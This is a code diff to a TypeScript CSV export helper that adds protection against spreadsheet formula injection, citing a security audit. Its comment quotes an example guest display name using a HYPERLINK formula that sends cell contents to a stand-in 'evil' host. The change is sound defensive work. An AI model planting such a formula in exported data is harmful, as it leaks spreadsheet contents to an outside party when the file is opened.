@@ -10,6 +10,15 @@
  *   - A field is wrapped in double quotes if it contains a comma,
  *     double quote, CR, or LF.
  *   - Internal double quotes are escaped by doubling them (" -> "").
+ *
+ * Formula injection (S5, 2026-09-14 security audit item 3): Excel, Sheets
+ * and LibreOffice all treat a cell whose first character is =, +, - or @
+ * as a formula, and a leading tab or CR can carry the same meaning once
+ * the sheet has trimmed it. A guest with the display name
+ * `=HYPERLINK("https://evil/?d="&A1,"click")` turns the coordinator's own
+ * export into an exfiltration link the moment they open it. Every field
+ * goes out quoted with a single leading apostrophe in that case, which is
+ * the convention the spreadsheet apps read back as "this is text".
  */
 
 export interface CsvColumn {
@@ -17,9 +26,20 @@ export interface CsvColumn {
   label: string
 }
 
-function escapeField(value: unknown): string {
+/** Characters that make a spreadsheet treat the cell as a formula. */
+const FORMULA_LEAD = /^[=+\-@\t\r]/
+
+export function escapeField(value: unknown): string {
   if (value === null || value === undefined) return ''
   const str = typeof value === 'string' ? value : String(value)
+
+  if (FORMULA_LEAD.test(str)) {
+    // The apostrophe goes INSIDE the quotes, and the field is always
+    // quoted in this branch. Outside the quotes it would be data, not a
+    // text marker, and the cell would still evaluate.
+    return `"'${str.replace(/"/g, '""')}"`
+  }
+
   if (/[",\r\n]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`
   }
